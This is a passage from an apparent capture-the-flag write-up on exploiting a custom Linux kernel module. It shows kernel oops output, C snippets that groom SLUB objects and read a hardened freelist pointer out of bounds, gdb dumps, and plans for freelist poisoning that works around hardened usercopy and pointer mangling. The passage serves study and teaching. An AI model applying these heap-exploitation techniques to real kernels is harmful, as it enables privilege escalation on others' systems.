+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span><span style="color:#56b6c2">[</span>   12.573559<span style="color:#56b6c2">]</span> R10: 00000000ffffdfff R11: ffffffffacc555e0 R12: <span style="color:#d19a66">0000000000000001</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span><span style="color:#56b6c2">[</span>   12.573675<span style="color:#56b6c2">]</span> R13: ffffa01ac19ba0e0 R14: fffffffffffffff2 R15: ffffb6d740173f08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">16</span><span><span style="color:#56b6c2">[</span>   12.573815<span style="color:#56b6c2">]</span> FS:  0000000000409cb8<span style="color:#56b6c2">(</span>0000<span style="color:#56b6c2">)</span> GS:ffffa01acf800000<span style="color:#56b6c2">(</span>0000<span style="color:#56b6c2">)</span> knlGS:0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">17</span><span><span style="color:#56b6c2">[</span>   12.573935<span style="color:#56b6c2">]</span> CS:  <span style="color:#d19a66">0010</span> DS: <span style="color:#d19a66">0000</span> ES: <span style="color:#d19a66">0000</span> CR0: <span style="color:#d19a66">0000000080050033</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">18</span><span><span style="color:#56b6c2">[</span>   12.574026<span style="color:#56b6c2">]</span> CR2: 000000000040601a CR3: 00000000019a4000 CR4: 00000000003006f0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">19</span><span><span style="color:#56b6c2">[</span>   12.574242<span style="color:#56b6c2">]</span> Call Trace:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">20</span><span><span style="color:#56b6c2">[</span>   12.575178<span style="color:#56b6c2">]</span>  &lt;TASK&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">21</span><span><span style="color:#56b6c2">[</span>   12.575606<span style="color:#56b6c2">]</span>  __check_heap_object+0x7d/0xa0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">22</span><span><span style="color:#56b6c2">[</span>   12.575858<span style="color:#56b6c2">]</span>  __check_object_size+0x166/0x2b0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">23</span><span><span style="color:#56b6c2">[</span>   12.575983<span style="color:#56b6c2">]</span>  kmem_cache_copy_to_user+0x85/0xe0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">24</span><span><span style="color:#56b6c2">[</span>   12.576196<span style="color:#56b6c2">]</span>  multifiles_read+0xa6/0xc0 <span style="color:#56b6c2">[</span>multifiles<span style="color:#56b6c2">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">25</span><span><span style="color:#56b6c2">[</span>   12.576675<span style="color:#56b6c2">]</span>  vfs_read+0xda/0x350
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">26</span><span><span style="color:#56b6c2">[</span>   12.576795<span style="color:#56b6c2">]</span>  ksys_read+0x6a/0xf0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">27</span><span><span style="color:#56b6c2">[</span>   12.576868<span style="color:#56b6c2">]</span>  do_syscall_64+0x9e/0x1a0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">28</span><span><span style="color:#56b6c2">[</span>   12.577066<span style="color:#56b6c2">]</span>  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">29</span><span><span style="color:#56b6c2">[</span>   12.577338<span style="color:#56b6c2">]</span> RIP: 0033:0x4042b0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">30</span><span><span style="color:#56b6c2">[</span>   12.578697<span style="color:#56b6c2">]</span>  &lt;/TASK&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">31</span><span><span style="color:#56b6c2">[</span>   12.578775<span style="color:#56b6c2">]</span> Modules linked in: multifiles<span style="color:#56b6c2">(</span>O<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">32</span><span><span style="color:#56b6c2">[</span>   12.579623<span style="color:#56b6c2">]</span> ---<span style="color:#56b6c2">[</span> end trace <span style="color:#d19a66">0000000000000000</span> <span style="color:#56b6c2">]</span>---
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">33</span><span><span style="color:#56b6c2">[</span>   12.581620<span style="color:#56b6c2">]</span> Kernel panic - not syncing: Fatal exception
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">34</span><span><span style="color:#56b6c2">[</span>   12.582376<span style="color:#56b6c2">]</span> Kernel Offset: 0x2aa00000 from 0xffffffff81000000 <span style="color:#56b6c2">(</span>relocation range: 0xffffffff80000000-0xffffffffbfffffff<span style="color:#56b6c2">)</span>
+</span></span></code></pre></div><p>This is hardened usercopy. Recall the cache is created with <code>kmem_cache_create_usercopy(..., offsetof(MultiFile, name), USERCOPY_SIZE, ...)</code> — useroffset <code>0x10</code>, usersize <code>0x90</code>. Only <code>[obj+0x10, obj+0xa0)</code> (<code>name</code> + <code>data</code>) is allowed to cross the user boundary. <code>__check_object_size</code> figures out which slab object our source pointer lands in (the neighbor) and checks the range against <em>its</em> usercopy region. Our copy started at <code>neighbor+0x00</code>, below <code>0x10</code>, so it aborts — &ldquo;offset 0, size 64&rdquo;.</p>
+<p>The takeaway is a hard constraint on the primitive: the OOB copy must start at <code>neighbor+0x10</code> or later, i.e. <strong><code>f_pos &gt;= 0x90</code></strong>. The header — <code>type</code>, <code>flags</code>, and (once the object is freed) the freelist pointer at offset <code>0</code> — is all unreachable this way. So the <code>bctf{:3}</code> canary cannot be leaked directly; it lives in the header precisely so hardened usercopy guards it.</p>
+<p>Pointing the read at the neighbor&rsquo;s <code>name</code> instead works cleanly (<code>f_pos=0x90</code> → start <code>obj+0xb0</code> = <code>neighbor+0x10</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#7f848e">// usercopy region is [name(0x10), 0xa0); copy must start at &gt;= neighbor+0x10
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#e5c07b">uint8_t</span> <span style="color:#e06c75">leak</span>[<span style="color:#d19a66">0x40</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#61afef;font-weight:bold">mf_read</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">a0</span>, <span style="color:#d19a66">0x90</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>)); <span style="color:#7f848e">// copy base obj+0xb0 = neighbor-&gt;name
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span><span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;[*] neighbor name = 0x%llx (&#39;%.16s&#39;)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">5</span><span>       <span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span> <span style="color:#e5c07b">long</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">leak</span>, (<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">leak</span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#56b6c2">[</span>*<span style="color:#56b6c2">]</span> neighbor <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> 0x3161 <span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;a1&#39;</span><span style="color:#56b6c2">)</span>
+</span></span></code></pre></div><p><code>0x3161</code> is <code>&quot;a1&quot;</code> — the name we gave the second object — confirming slot 0 and slot 1 are adjacent and the OOB read works. The primitive is validated, with the constraint baked in: we can only see <code>[neighbor+0x10, neighbor+0xa0)</code> (<code>name</code> + <code>data</code>).</p>
+<h3 id="free-the-chunk">Free the chunk</h3>
+<p>Let&rsquo;s free the neighbor (<code>mf_delete</code>) and look at what SLUB leaves behind.</p>
+<p>Dumping the freed object (shown here in gdb at its real address; everything in <code>[0x10, 0xa0)</code> is also reachable through our OOB read):</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span>0xffff8880039980a0 +0x00: 0x0000000000000001           <span style="color:#e5c07b">type</span>   <span style="color:#56b6c2">(</span>NOT cleared on free<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>0xffff8880039980a8 +0x08: 0x7d333a7b66746362  bctf<span style="color:#56b6c2">{</span>:3<span style="color:#56b6c2">}</span>  flags  <span style="color:#56b6c2">(</span>NOT cleared<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span>0xffff8880039980b0 +0x10: 0x0000000000003161  <span style="color:#98c379">&#34;a1&#34;</span>      name   <span style="color:#56b6c2">(</span>NOT cleared<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>0xffff8880039980b8 +0x18: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>0xffff8880039980c0 +0x20: 0x0000000000000000           data<span style="color:#56b6c2">[</span>0<span style="color:#56b6c2">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>   ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>0xffff8880039980f0 +0x50: 0x76bb00d4c7d73040  &lt;-- freelist pointer
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span>0xffff8880039980f8 +0x58: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>   ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>0xffff888003998140 +0xa0: 0x0000000000000001           <span style="color:#56b6c2">(</span>next object&#39;s <span style="color:#e5c07b">type</span><span style="color:#56b6c2">)</span>
+</span></span></code></pre></div><p>Two things stand out.</p>
+<p>First, <strong>SLUB does not zero an object on free</strong> — it only writes the freelist pointer. That&rsquo;s why <code>type</code>, <code>flags</code> (<code>bctf{:3}</code>) and <code>name</code> (&ldquo;a1&rdquo;) survive untouched in the freed chunk.</p>
+<p>Second, the freelist pointer sits at <strong>offset <code>0x50</code></strong>, not <code>0</code>. That&rsquo;s <code>sizeof(MultiFile) / 2</code>, the result of the &ldquo;relocate freelist pointer to the middle of the object&rdquo; hardening. Crucially <code>0x50</code> falls inside <code>[0x10, 0xa0)</code> — the usercopy region — so unlike the <code>0x00</code> header, <strong>we can both read and write the freelist pointer through the OOB primitive.</strong></p>
+<p>Why does the value (<code>0x76bb00d4c7d73040</code>) look like garbage? <code>CONFIG_SLAB_FREELIST_HARDENED</code> mangles it:</p>
+<pre tabindex="0"><code>fp = next ^ s-&gt;random ^ bswap64(&amp;slot)
+</code></pre><p>where <code>&amp;slot</code> is the address of the pointer itself (<code>obj+0x50</code>), <code>next</code> is the next free object in the list, and <code>s-&gt;random</code> is a per-cache secret. A single read is one equation with three unknowns — we can&rsquo;t naively decode it, nor forge an arbitrary pointer to write back.</p>
+<h3 id="reading-it-through-the-oob-primitive">Reading it through the OOB primitive</h3>
+<p>The dump above is gdb at the object&rsquo;s real address; in the exploit we only have <code>read()</code>. To pull <code>neighbor+0x50</code> into a 64-byte copy window the copy has to start at or before it: <code>f_pos=0x98</code> sets the base to <code>obj+0xb8 = neighbor+0x18</code>, and a <code>0x40</code>-byte read spans <code>neighbor[0x18, 0x58)</code>, so the encoded word at <code>neighbor+0x50</code> lands at <code>leak+0x38</code>.</p>
+<p>We also need the neighbor to actually be <em>free</em> — otherwise <code>+0x50</code> is just zeroed <code>data</code> — and we want its <code>next</code> to be a value we can reason about. So allocate three adjacent objects and free the last two. SLUB&rsquo;s per-cpu freelist is LIFO, so freeing <code>b2</code> then <code>b1</code> leaves <code>b1-&gt;next == b2</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">b0</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e06c75">fd</span>, <span style="color:#98c379">&#34;b0&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">b1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e06c75">fd</span>, <span style="color:#98c379">&#34;b1&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">b2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e06c75">fd</span>, <span style="color:#98c379">&#34;b2&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span><span style="color:#61afef;font-weight:bold">mf_delete</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">b2</span>);   <span style="color:#7f848e">// free b2 first
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span><span style="color:#61afef;font-weight:bold">mf_delete</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">b1</span>);   <span style="color:#7f848e">// then b1  -&gt;  b1-&gt;next == b2, freeptr written at b1+0x50
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span><span style="color:#e5c07b">uint8_t</span> <span style="color:#e06c75">leak</span>[<span style="color:#d19a66">0x40</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span><span style="color:#61afef;font-weight:bold">mf_read</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">b0</span>, <span style="color:#d19a66">0x98</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>));   <span style="color:#7f848e">// window b1[0x18, 0x58)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">enc</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span><span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">enc</span>, <span style="color:#e06c75">leak</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x38</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">enc</span>));      <span style="color:#7f848e">// b1+0x50
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span><span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;[+] encoded freelist ptr @ b1+0x50 = 0x%016llx</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span>       (<span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span> <span style="color:#e5c07b">long</span>)<span style="color:#e06c75">enc</span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> encoded freelist ptr @ b1+0x50 <span style="color:#56b6c2">=</span> 0x4b89a339485018db
+</span></span></code></pre></div><p>That <code>0x4b89a339485018db</code> is <code>b2 ^ s-&gt;random ^ bswap64(b1+0x50)</code> — kernel-controlled metadata, not the <code>name</code> bytes we picked. Reading (and writing) <code>+0x50</code> is now a real code primitive, not just a gdb observation.</p>
+<h3 id="what-the-membership-check-rules-out">What the membership check rules out</h3>
+<p>Before building on the freelist pointer, look at the custom gate every copy goes through (<code>kernel-cache-usercopy.diff</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#c678dd">static</span> <span style="color:#e5c07b">bool</span> <span style="color:#61afef;font-weight:bold">kmem_cache_has_object</span>(<span style="color:#c678dd">struct</span> <span style="color:#e06c75">kmem_cache</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">cachep</span>, <span style="color:#c678dd">const</span> <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">ptr</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span>	<span style="color:#c678dd">struct</span> <span style="color:#e06c75">slab</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">slab</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">virt_to_slab</span>(<span style="color:#e06c75">ptr</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">slab</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">slab</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">slab_cache</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">cachep</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span>}
+</span></span></code></pre></div><p>This is a <strong>per-slab-folio</strong> check: it resolves the page <code>ptr</code> lives in and requires <code>slab-&gt;slab_cache == multifiles_cache</code>. The consequence for a cross-cache plan: if we drain a multifiles slab page back to the buddy allocator and let another cache (say <code>filp_cachep</code>) reclaim it, that page&rsquo;s <code>slab_cache</code> is no longer <code>multifiles_cache</code>, so any OOB read/write through <code>multifiles_read</code>/<code>write</code> fails the check. <strong>We cannot OOB-read a reclaimed <code>struct file</code> directly</strong> — the naive &ldquo;cross-cache then read the foreign object&rdquo; approach is dead on arrival.</p>
+<p>So the workable primitive is the freelist pointer we can read and write at <code>+0x50</code>. The remaining problem is weaponizing it under the hardening: either leak <code>s-&gt;random</code> + a heap address, or use a poisoning trick that cancels both (page-relative deltas XOR out the page base and the secret). That&rsquo;s the next step.</p>
+<h3 id="decoding-the-freelist-pointer">Decoding the freelist pointer</h3>
+<h4 id="primary-source">Primary source</h4>
+<p>The encoding lives in <code>freelist_ptr_encode()</code> in <a href="https://elixir.bootlin.com/linux/v6.12/source/mm/slub.c"><code>mm/slub.c</code> (v6.12)</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#c678dd">static</span> <span style="color:#c678dd">inline</span> <span style="color:#e5c07b">freeptr_t</span> <span style="color:#61afef;font-weight:bold">freelist_ptr_encode</span>(<span style="color:#c678dd">const</span> <span style="color:#c678dd">struct</span> <span style="color:#e06c75">kmem_cache</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">s</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>                    <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">ptr</span>, <span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span> <span style="color:#e06c75">ptr_addr</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>    <span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span> <span style="color:#e06c75">encoded</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span><span style="color:#7f848e">#ifdef CONFIG_SLAB_FREELIST_HARDENED
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>    <span style="color:#e06c75">encoded</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span>)<span style="color:#e06c75">ptr</span> <span style="color:#56b6c2">^</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">random</span> <span style="color:#56b6c2">^</span> <span style="color:#61afef;font-weight:bold">swab</span>(<span style="color:#e06c75">ptr_addr</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span><span style="color:#7f848e">#else
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span>    <span style="color:#e06c75">encoded</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span>)<span style="color:#e06c75">ptr</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span><span style="color:#7f848e">#endif
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>    <span style="color:#c678dd">return</span> (<span style="color:#e5c07b">freeptr_t</span>){.<span style="color:#e06c75">v</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">encoded</span>};
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>}
+</span></span></code></pre></div><p>and <code>set_freepointer()</code> fixes <code>ptr_addr</code> to the storage slot itself:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span> <span style="color:#e06c75">freeptr_addr</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span>)<span style="color:#e06c75">object</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">offset</span>;
